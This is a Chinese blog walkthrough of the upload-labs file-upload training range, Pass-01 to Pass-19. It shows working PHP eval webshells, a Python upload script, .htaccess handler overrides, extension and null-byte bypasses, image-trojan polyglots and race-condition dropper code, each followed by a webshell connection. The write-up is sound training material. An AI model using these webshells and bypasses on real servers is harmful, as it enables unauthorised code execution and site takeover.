---
title: 'Upload Labs 攻略'
date: '2025-04-28T17:02:52+08:00'
weight: 
draft: false
description: 'Upload Labs 攻略'
---

## upload-labs 简介

upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场，旨在帮助大家对上传漏洞有一个全面的了解，目前一共 20 关，每一关都包含着不同上传方式。

**注意：**

1. 每一关没有固定的通关方法，大家不要自限思维！

2. 本项目提供的 writeup 只是起一个参考作用，希望大家可以分享出自己的通关思路。

3. 实在没有思路时，可以点击查看提示。

4. 如果黑盒情况下，实在做不出，可以点击查看源码。

**后续:**

如在渗透测试实战中遇到新的上传漏洞类型，会更新到 upload-labs 中。当然如果你也希望参加到这个工作当中，欢迎 pull requests 给我!

项目地址：https://github.com/c0ny1/upload-labs

![文件上传](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/文件上传.3k88gqmp8o.webp)

## Pass-01

尝试上传 `fish.php`，提示只能上传 `.jpg|.png|.gif` 类型的文件

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_18-58-11.73u5gkyjm9.png)

上传文件后抓包失败，考虑是否为客户端 `JavaScript` 检查，检查页面元素发现 `JavaScript` 内容

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

**1、禁用 JavaScript**

使用扩展 `Disable JavaScript` 禁用 JavaScript 后直接上传 `fish.php`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_19-49-06.77drecl2w4.webp)

**2、requests 请求模拟**

使用 Python 的 `requests` 模块进行模拟请求，绕过客户端检查

```python
import requests

url = "http://192.168.126.129/upload-labs-0.1/Pass-01/index.php"

files = {
    'upload_file': ('fish.php', '<?php @eval($_POST[\'fish\']) ?>')
}

data = {
    'submit': '上传'
}

headers = {
    'Referer': 'http://192.168.126.129/upload-labs-0.1/Pass-01/index.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Origin': 'http://192.168.126.129',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
}

response = requests.post(url, headers=headers, files=files, data=data)

with open('response_text/upload-labs-less01.html', 'w', encoding='utf-8') as f:
    f.write(response.text)

print('Success')
```

**3、劫持请求修改文件后缀**

将 `fish.php` 的后缀名修改为 `.jpg` 进行上传，绕过客户端检查后劫持请求，将 `filename=fish.jpg` 修改为 `filename=fish.php`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_19-42-23.9kgdvjq8af.webp)

**4、复制 html 到本地修改**

将整个 `html` 代码复制到本地，删除 `javascript` 部分的内容，为 `form` 添加 `action` 属性（表单提交数据的目标地址），直接提交 `fish.php`

```html
<form action="http://192.168.126.129/upload-labs-0.1/Pass-01/index.php" enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
  <p>请选择要上传的图片：</p>
  <p>
    <input class="input_file" type="file" name="upload_file">
    <input class="button" type="submit" name="submit" value="上传"></p>
</form>
```

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_20-18-32.7zqmw43lx8.webp)

## Pass-02

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 提示“文件类型不正确，请重新上传”，判断为 **白名单** 类型

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_23-01-47.8vn4bq7eb0.webp)

**尝试 `MIME` 绕过**

MIME (Multipurpose Internet Mail Extensions) 多用途互联网邮件扩展是一种标准，用来表示文档、文件或一组数据的性质和格式。

通用结构：`type/subtype`

|     类型      |  描述   |                            示例                            |
|:-----------:|:-----:|:--------------------------------------------------------:|
|    text     | 普通文本  | `text/plain`, `text/html`, `text/css`, `text/javascript` |
|    image    |  图像   |          `image/gif`, `image/png`, `image/jpeg`          |
| application | 二进制数据 |  `application/x-httpd-php`, `application/octet-stream`   |

上传 `fish.php`，劫持请求

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-43-52.3d4zwkrufq.webp)

将 `Content-Type` 从 `application/octet-stream` 修改为 `image/jpeg`

![PixPin_2025-04-29_15-47-15](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-47-15.969y5vjei5.webp)

上传成功

![PixPin_2025-04-29_15-52-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-52-20.8hgolv2k6w.webp)

## Pass-03

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

**尝试上传特殊可解析后缀**

将 `fish.php` 的后缀名修改为 `.php5` 进行上传，上传成功

![PixPin_2025-04-29_17-30-42](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-30-42.3goluegrq7.webp)

> [!WARNING]
> 这里使用蚁剑进行连接出现连接失败，经过多次尝试发现这里需要 `php-5.4.45` 的环境，并且需要将 Apache 配置文件 `httpd-conf` 的 `403` 行 `#AddType application/x-httpd-php .php .phtml` 修改为 `AddType application/x-httpd-php .php .phtml .php1 .php2 .php3 .php4 .php5 .pht`，使服务器可以正常将这些后缀名的文件解析为 `php`。

## Pass-04

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

上传特殊可解析后缀 `fish.php5` 提示“此文件不允许上传”

![PixPin_2025-04-29_17-49-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp)

**尝试上传 `.htaccess`**

前面 `fish.jpg` 上传成功，但访问时服务器会将它解析为一个图片，提示“图像因存在错误而无法显示”

`.htaccess` 是一个配置文件，用于 Apache 服务器的目录级配置，它允许为特定的目录或文件定义服务器配置，而不需要修改 Apache 的主配置文件。

新建 `.htaccess` 文件并添加以下内容，使服务器可以将 `fish.jpg` 解析为 `php` 文件

```text {filename=".htaccess"}
<FilesMatch "fish.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

上传 `.htaccess`

![PixPin_2025-04-29_17-59-07](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-59-07.2yyk5udqav.webp)

> [!WARNING]
> 若上传 `.htaccess` 文件后仍然无法将 `fish.jpg` 解析为 `php` 文件，检查 Apache 的配置文件 `httpd-conf`，修改 `AllowOverride` 为 `All`，允许 `.htaccess` 文件在其目录下进行任意的配置覆盖

```text
DocumentRoot  "C:\phpStudy\WWW"
<Directory />
    Options +Indexes +FollowSymLinks +ExecCGI
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
</Directory>
```

访问 `fish.jpg` 不再提示“图像因存在错误而无法显示”，使用蚁剑成功连接

![PixPin_2025-04-29_18-00-48](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-00-48.6bha07w2o2.webp)

## Pass-05

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

上传特殊可解析后缀 `fish.php5` 提示“此文件不允许上传”

![PixPin_2025-04-29_17-49-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp)

上传 `.htaccess` 提示“此文件类型不允许上传”

![PixPin_2025-04-29_18-58-34](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-58-34.4n7x33837l.webp)

尝试 **后缀大小写绕过**

将 `fish.php` 的后缀名修改为 `.PhP` 进行上传，上传成功

![PixPin_2025-04-29_19-02-44](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_19-02-44.6m43tfiup2.webp)

## Pass-06

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

尝试 **空格绕过**，上传成功

![PixPin_2025-05-08_20-21-37](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-21-37.2h8iu9eio3.webp)


## Pass-07

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

尝试 **点绕过**，上传成功

![PixPin_2025-05-08_20-28-19](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-28-19.51ed6wnhtq.webp)

## Pass-08

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

尝试 **::$DATA** 绕过，上传成功

![PixPin_2025-05-09_16-21-49](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-21-49.b949ohldd.webp)

使用蚁剑进行连接

![PixPin_2025-05-09_16-27-52](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-27-52.magja8n6.webp)

## Pass-09

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

尝试 **点空格点绕过**，上传成功

![PixPin_2025-05-09_16-52-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-52-41.969yk8a7oc.webp)

使用蚁剑进行连接

![PixPin_2025-05-09_17-00-12](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp)

## Pass-10

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

尝试 **后缀双写**，上传成功

![PixPin_2025-05-09_17-03-49](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-03-49.26lp2cccua.webp)

使用蚁剑进行连接

![PixPin_2025-05-09_17-00-12](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp)

## Pass-11

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 失败，判断为 **白名单** 类型

![PixPin_2025-05-09_17-10-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp)

> [!WARNING]
> PHP ≤ 5.3.3 ，`php.ini` 配置 `magic_quotes_gpc = Off`

尝试 **%00 截断**，上传成功

![PixPin_2025-05-09_17-43-34](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-43-34.5c171blndq.webp)

使用蚁剑进行连接

![PixPin_2025-05-09_17-45-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp)

## Pass-12

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 失败，判断为 **白名单** 类型

![PixPin_2025-05-09_17-10-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp)

尝试 **0x00 截断** （先使用空格进行占位，再修改为 `00`），上传成功

![PixPin_2025-05-09_17-48-43](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-48-43.esq7heez2.webp)

![PixPin_2025-05-09_17-49-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-49-20.2veymem0rp.webp)

使用蚁剑进行连接

![PixPin_2025-05-09_17-45-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp)

## Pass-13

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 失败，判断为 **检查内容** 类型

![PixPin_2025-05-09_18-08-18](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-08-18.9o008w0nab.webp)

为 `fish1.php` 添加 **文件头**

| Hex 文件签名                                                                                                                              |                             ISO 8859-1                             |      文件扩展名       |
|:--------------------------------------------------------------------------------------------------------------------------------------|:------------------------------------------------------------------:|:----------------:|
| `FF D8 FF DB`<br/>`FF D8 FF E0 00 10 4A 46 49 46 00 01`<br/>`FF D8 FF EE`<br/>`FF D8 FF E1 ?? ?? 45 78 69 66 00 00`<br/>`FF D8 FF E0` | `ÿØÿÛ`<br/>`ÿØÿà␀␐JFIF␀␁`<br/>`ÿØÿî`<br/>`ÿØÿá??Exif␀␀`<br/>`ÿØÿà` | `jpg`<br/>`jpeg` |
| `89 50 4E 47 0D 0A 1A 0A`                                                                                                             |                             `‰PNG␍␊␚␊`                             |      `png`       |
| `47 49 46 38 37 61`<br/>`47 49 46 38 39 61`                                                                                           |                       `GIF87a`<br/>`GIF89a`                        |      `gif`       |

1、jpg

使用 `11` 进行占位

```text {filename=fish2.php}
11<?php @eval($_POST['fish']) ?>
```

使用 `hexedit` 替换 `11` 为 `jpg` 文件签名 `FF D8`

![PixPin_2025-05-09_18-28-59](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-28-59.7pic38lj4.webp)

上传 `fish2.php` 成功，利用任意文件包含漏洞使用蚁剑进行连接

![PixPin_2025-05-09_19-12-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-12-29.2veymhle0a.webp)


2、png

使用 `11` 进行占位

```text {filename=fish3.php}
11<?php @eval($_POST['fish']) ?>
```

使用 `hexedit` 替换 `11` 为 `png` 文件签名 `89 50`

![PixPin_2025-05-09_19-29-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-29-50.icc5atgqa.webp)

上传 `fish3.php` 成功，利用任意文件包含漏洞使用蚁剑进行连接

![PixPin_2025-05-09_19-31-07](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-31-07.wirw63qfj.webp)

3、gif

使用 `11` 进行占位

```text {filename=fish4.php}
11<?php @eval($_POST['fish']) ?>
```

使用 `hexedit` 替换 `11` 为 `gif` 文件签名 `47 49`

![PixPin_2025-05-09_19-36-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-36-50.pfk0qon3i.webp)

上传 `fish4.php` 成功，利用任意文件包含漏洞使用蚁剑进行连接

![PixPin_2025-05-09_19-38-01](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-38-01.86tv783uwl.webp)

## Pass-14

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 失败，判断为 **白名单** 类型

![PixPin_2025-05-09_17-10-29](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp)

尝试 **上传图片马**

将 `fish1.php` 追加到 `fish_real.jpg` 末尾，生成 `fish_trojan.jpg`

```shell
cat fish_real.jpg fish1.php > fish_trojan.jpg
```

查看 `fish_trojan.jpg` 最后 10 行的数据内容，确认一句话木马被正确追加

```shell
┌──(hailo㉿kali-Hailo)-[~/workspace/upload-labs]
└─$ hexdump -C fish_trojan.jpg | tail
0003b200  93 f8 55 c6 b7 8d 49 60  b5 11 c6 7a 51 70 22 c3  |..U...I`...zQp".|
0003b210  7a d0 0b 8f 53 4e ef 4a  25 6c f4 14 5c 06 ac a7  |z...SN.J%l..\...|
0003b220  71 06 9e 65 c8 c0 00 52  15 56 ed cd 21 8c 50 01  |q..e...R.V..!.P.|
0003b230  b4 7f 7a 8d 87 d6 8c 6d  14 64 d2 18 bc fa d1 b8  |..z....m.d......|
0003b240  f7 a3 39 a3 14 00 1e 7a  51 83 4a 06 28 ce 29 5c  |..9....zQ.J.(.)\|
0003b250  60 29 43 1a 4a 29 0d 0b  b9 8f 1d 28 12 4c 9d 0e  |`)C.J).....(.L..|
0003b260  7e b4 6e 34 e0 f4 0c ff  d9 3c 3f 70 68 70 20 40  |~.n4.....<?php @|
0003b270  65 76 61 6c 28 24 5f 50  4f 53 54 5b 27 66 69 73  |eval($_POST['fis|
0003b280  68 27 5d 29 20 3f 3e                              |h']) ?>|
0003b287

```

上传 `fish_trojan.jpg` 成功，利用任意文件包含漏洞使用蚁剑进行连接

![PixPin_2025-05-09_20-07-54](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-07-54.5fksz6kkoc.webp)

## Pass-15

> [!WARNING]
> 需要开启 php_exif 扩展模块

![PixPin_2025-05-09_20-12-54](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-12-54.2obqr45zsi.webp)

上传 `fish_trojan.jpg` 成功，利用任意文件包含漏洞使用蚁剑进行连接

![PixPin_2025-05-09_20-19-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-19-03.7egzpj41lr.webp)

## Pass-16

尝试 **二次渲染绕过**

1、gif 绕过

上传正确的图片 `fish_real.gif`，将上传后的照片另存为 `fish2_real.gif`，并使用 010 Editor 比较两张图片

![PixPin_2025-05-13_16-31-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-31-41.67xomf255n.webp)

在未被二次渲染的部分插入一句话木马，另存为 `fish2_trojan.gif` 后上传成功

![PixPin_2025-05-13_16-32-08](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-32-08.3nru9s2rc0.webp)

使用蚁剑进行连接

![PixPin_2025-05-13_16-33-04](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-33-04.7i0lsqm0ma.webp)

2、png 绕过

使用 Python 写了一个用于 png 二次渲染绕过的脚本，项目地址：[png_payload](https://github.com/Puppy1599/png_payload)

```shell
python png_payload.py --input fish.png --payload "<?php @eval($_POST['fish']);?>" --offset 0
```

可以使用 010 Editor 看到 `fish-payload.png` 中注入的 payload

![PixPin_2025-05-14_20-42-43](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-42-43.5xauuy1njo.webp)

上传成功，但下载上传后的图片发现 payload 不完整

![PixPin_2025-05-14_20-44-02](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-44-02.4jobqws99w.webp)

> [!WARNING]
> 经过测试需要设置一个合适的 PLTE block 偏移量，当 `offset` 为 `0` 时 payload 将被注入到 PLTE 头部，可能导致二次渲染后的 payload 不完整。

将 `offset` 设置为 `30`

```shell
python png_payload.py --input fish.png --payload "<?php @eval($_POST['fish']);?>" --offset 30
```

![PixPin_2025-05-14_20-44-47](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-44-47.2rvcw09ual.webp)

上传成功，下载上传后的图片发现 payload 完整

![PixPin_2025-05-14_20-45-33](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-45-33.92qctvzok3.webp)

使用蚁剑进行连接

![PixPin_2025-05-14_20-46-11](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-46-11.5xauuy655i.webp)

3、jpg 绕过

参考了一个用于 jpg 二次渲染绕过的 php 脚本并使用 Python 进行了打包，项目地址：[jpg_payload](https://github.com/Puppy1599/jpg_payload)

上传正确的图片 `fish_real.jpg`，将上传后的照片另存为 `fish2_real.jpg`，使用 `jpg_payload` 注入 payload

```shell
jpg_payload.exe fish2_real.jpg "<?php @eval($_POST['fish']);?>"
```

可以使用 010 Editor 看到 `payload_fish2_real.jpg` 中注入的 payload

![PixPin_2025-05-14_22-33-00](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-33-00.7p3tpyitno.webp)

上传成功，下载上传后的图片发现 payload 完整

![PixPin_2025-05-14_22-33-46](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-33-46.1ap7ud1ux8.webp)

使用蚁剑进行连接

![PixPin_2025-05-14_22-40-40](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-40-40.67xoo7omw0.webp)

> [!WARNING]
> jpg 图片二次渲染绕过不易成功，需要多换几张图片尝试。

## Pass-17

利用 **条件竞争绕过**

上传 `shell.php`（用于生成 `fish.php`）

```php {filename="shell.php"}
<?php fputs(fopen("fish.php","w"), "<?php @eval(\$_POST['fish']);?>");?>
```

![PixPin_2025-05-15_20-31-42](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-31-42.pfk9dfmmv.webp)

访问 `shell.php`

![PixPin_2025-05-15_20-36-21](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-36-21.3k88f5vfz0.webp)

将 `/upload-labs-0.1/Pass-17/index.php` 和 `/upload-labs-0.1/upload/shell.php` 两条记录发送到 `Intruder` 模块

![PixPin_2025-05-15_20-36-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-36-50.2veyv58jqp.webp)

设置两条记录 `Payload 类型` 为 `Null payloads`，无限重复

![PixPin_2025-05-15_20-44-10](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-44-10.1vyvhzfbp9.webp)

设置两条记录 `最大并发请求数` 为 `25`

![PixPin_2025-05-15_20-45-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-45-20.2obqzpxb0n.webp)

![PixPin_2025-05-15_20-46-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-46-41.67xopj1rkz.webp)

开始攻击

![PixPin_2025-05-15_20-45-54](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-45-54.9kgejwhbhv.webp)

![PixPin_2025-05-15_20-46-57](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-46-57.8ojx4g8zux.webp)

观察到 `/upload-labs-0.1/upload/shell.php` 攻击时出现 `200` 状态码时停止攻击

![PixPin_2025-05-15_20-48-33](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-48-33.73u64zdv2a.webp)

使用蚁剑连接 `fish.php`

![PixPin_2025-05-15_20-49-17](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-49-17.3yeo61kdzi.webp)

## Pass-18

> [!WARNING]
> 这里的路径拼接有问题，上传一个 `jpg` 图片应该是 `upload/1747315674.jpg`，但实际拼出来的是 `upload1747315674.jpg`，修改 `Pass-18/myupload.php` 的 `$this->cls_upload_dir = $dir;` 为 `$this->cls_upload_dir = $dir.'/';`

![PixPin_2025-05-15_21-38-24](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_21-38-24.6pnqe5xqw1.webp)

利用 **Apache 多后缀解析漏洞 + 条件竞争**

上传 `shell.php.7z`（用于生成 `fish.php`）

```php {filename="shell.php.7z"}
<?php fputs(fopen("fish.php","w"), "<?php @eval(\$_POST['fish']);?>");?>
```

![PixPin_2025-05-16_21-17-47](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-17-47.5mo14or8rq.webp)

访问 `shell.php.7z`

![PixPin_2025-05-16_21-18-52](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-18-52.1sf9lqaml8.webp)

将两条请求发送到 `Intruder` 模块

![PixPin_2025-05-16_21-20-46](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-20-46.8z6qz2bl5w.webp)

配置条件竞争的 `payload`

![PixPin_2025-05-16_21-21-32](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-21-32.7zqnlw9sq9.webp)

![PixPin_2025-05-16_21-21-49](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-21-49.6f0wmfcy6h.webp)

观察到 `/upload-labs-0.1/upload/shell.php.7z` 攻击时出现 `200` 状态码时停止攻击

![PixPin_2025-05-16_21-22-28](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-22-28.969yuhzx9v.webp)

使用蚁剑连接 `fish.php`

![PixPin_2025-05-15_20-49-17](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-49-17.3yeo61kdzi.webp)

## Pass-19

尝试 **点绕过**

保存名称 `fish1.php.`，上传成功

